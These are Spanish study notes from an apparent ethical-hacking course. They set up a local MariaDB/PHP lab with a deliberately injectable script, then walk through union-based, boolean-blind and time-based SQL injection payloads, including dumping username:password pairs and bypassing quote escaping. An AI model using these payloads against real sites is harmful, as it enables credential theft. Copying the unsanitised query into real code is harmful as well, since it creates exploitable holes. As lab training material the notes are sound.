Instalamos
	apt install mariadb-server apache2 php-mysql

	service mysql start
	service apache2 start
	mysql -uroot -p 

	show databases;
	use mysql;
	show tables;
	para ver columnas --> describe user;

Todo funciona mediante querys
Por ejemplo:
Inicio sesion pero en vez de poner contraseña ingreso codigo para alterar la query

	select user,password from user;
	(selecciono la fila user y password desde la tabla user)


Si quiero realizar una busqueda mas especifica de usuario o contraseña puedo usar el siguiente comando

	select user,password from user where user = 'root';

o

	select user,password from user where password = 'xxxx'


Para crear una DB

	create database Hack4u;

Creamos la tabla:
	**create table users(id int(32), username varchar(32), password varchar(32));**

	Para ver la tabla creada:
	describe users;

Para insertar los usuario y contraseñas:

	insert into users(id, username, password) values(1, 'admin', 'root');

Para actualizar algun usuario o contraseña existente:
	update users set id=2 where username='ken';

	(update users set) --> users es la columna
	-> el comando es 'update ___ set'

Ahora si queremos ver/listar las columnas username que acabamos de crear

	select username from users;
Si queremos listar todas las columnas y filas de users
	select * from users;
	

Para crear un usuario especial y se pueda conectar a la base de datos:
	`create user 'ken'@'localhost'  identified by 'ken123'`
		Lo que se esta haciendo es crear el usuario ken en localhost con la contraseña ken123

Para darle privilegios al usuario que se acaba de crear 
`grant all privileges on Hack4u.* to 'ken'@'localhost';`
		esto hace que tenga acceso a la base de datos Hack4u a todas las rutas *
		


se creo un script en /var/ww/html llamado searchUsers.php

`?php`
  `$server = "localhost";`
  `$username = "ken";`
  `$password = "ken123";`
  `$database = "Hack4u";`

  `$conn = new mysqli($server, $username, $password, $database);`
  `$id = $_GET['id'];`

  `$data = mysqli_query($conn, "select username from users where id = '$id'") or>`
  `$response = mysqli_fetch_array($data);`
  `echo $response['username'];`

`?>`

Esto enlaza la conexion de maria db a php
ademas aqui se puede hacer injeccion sql error based ya que al poner una comilla en ?id=1'
da error


para listar las columnas en MariaDB se puede utilizar el siguiente codigo:
```
select username,password from users where id= '1' order by 2;-- -';

```

para hacerlo desde el mismo navegador:
?id=`select username from users where id= '1' order by 1-- -

![[Pasted image 20250314165156.png]]


Para inyectar texto se puede hacer:
`select username from users where id = '1' union select "cualquier texto";-- -';`

![[Pasted image 20250314165502.png]]
Es importante saber el numero de columnas para poder inyectar codigo ya que si no no hacen match
en este caso se puso username,password "texto1","texto2"


Desde la web para saber el nombre de la base de datos:
id=99999' union select database()-- -
![[Pasted image 20250318111621.png]]

Para saber el nombre de todas las bases de datos:
id=9999' union select schema_name from information_schema.schemata-- -
![[Pasted image 20250318111939.png]]

OJO PIROJO:
No siempre te muestra todas las bases

Se puede limitar el output de la siguiente manera:
id=9999' union select schema_name from information_schema.schemata limit 1,1-- -

Para representar todas se puede hacer de la siguiente manera(representa todas las db, separadas mediante comas)
id=8881' union select group_concat(schema_name) from information_schema.schemata-- -
![[Pasted image 20250318112812.png]]

Ahora si quiero saber en la db Hack4u que tablas hay:
id=8881' union select group_concat(table_name) from information_schema.tables where table_schema='Hack4u'-- -

![[Pasted image 20250318114517.png]]

Practicamente lo mismo para la tabla users
id=8881' union select group_concat(column_name) from information_schema.columns where table_schema='Hack4u' and table_name='users'-- -

![[Pasted image 20250318114725.png]]

ya sabiendo las tablas, ahora nos interesa el contenido de la columna password para ello solo hacemos:
id=99999' union select group_concat(password) from users-- -

y para ver usuario y contraseña usamos:
id=99999' union select group_concat(username,':',password) from users-- -
![[Pasted image 20250318115724.png]]

Si llegara a entrar en conflicto las comillas se puede usar los ':' en hexadecimal
en Linux ---> MAN ASCII
se reemplaza ':' por 0x3a

EN CASO DE QUE NO SE MUESTREN LOS ERRORES SE PUEDE UTILIZAR EL SIGUIENTE CODIGO
id=1' order by 100 hasta llegar a las tablas correspondientes
id=1' order by 1,1 o 1,2--> esto aplica si en la configuracion php esta username, password, mas adelante se susituye por database() para saber la base de datos que tenemos 

De manera similar al inicio para saber en que base de datos estamos se puede utilizar :
id=1' union select database(),2-- -

Otra manera de saber que la web es vulnerable a injeccion sql es de la siguiente manera :
Esto hace que la web tarde 5 seg en responder
Si utilizas id=1' and sleep(5)-- -


Si no se realiza una correcta sanitizacion en la linea 12
id debe de ir con comilla es decir '$id'
![[Pasted image 20250318162502.png]]


SANITIZACION QUE EVITA QUE SE PUEDA JUGAR CON COMILLAS
![[Pasted image 20250320233607.png]]



BOOLEAN BASED BLIND SQL INJECTION

select  substring(username,1,1) from users where id = 1;
lo que hace esto es devolverte la primera letra del username
en este caso tenemos admin y saldra   'a'

Para burlar la parte de la comilla lo que se puede hacer es poner en modo ascii es decir
select ascii substring(username,1,1) from users where id = 1;


Aqui lo que hacemos es convertir la letra 'a' a ascii y da 97
despues lo que hacemos es un select del select y lo igualamos a 97 por lo tanto dara 1 de que es correcto
Si es incorrecto dara 0
![[Pasted image 20250320234319.png]]

Si es incorrecto dara cero:
![[Pasted image 20250320234347.png]]


Nos copiamos la sentencia
select(select ascii (substring(username,1,1)) from users where id = 1)=98;

abrimos terminal 
copiamos y hacemos un curl
![[Pasted image 20250320234652.png]]

lo que indicamos es que si id=2 de codigo de estado exitoso si coincide 
En la imagen se muestra si es incorrecto el valor
y en la ultima se agreg or 1=1
lo que hace que si id no es igual a 9 pruebe con 1=1



SQL INJECTION BASADA EN TIEMPO
lo que se hace es ?id= select  * from users where id = 1 and sleep(5);
Lo que hace es que tarda en responder 5 seg y te despliega lo de users

Si hacemos:
select * from users where id = 1 and of (substr(database(),1,1)='a',sleep(5),1);

Esto hace que si la letra a de users es correcta que tarde 5 segundos en responder
PERO DEBIDO A LA SANITIZACION Y NO PERMITE EL USO DE COMILLAS OSEA LAS ESCAPA TIENES QUE UTILIZARLO EN ASCII ES DECIR

select * from users where id = 1 and if(ascii(substr(database(),1,1))=104,sleep(5),1);

esto hace que pruebe con la letra H de ascii osea 104 y te arroja resultado, es una manera sencilla de evitar la sanitizacion de las comillas



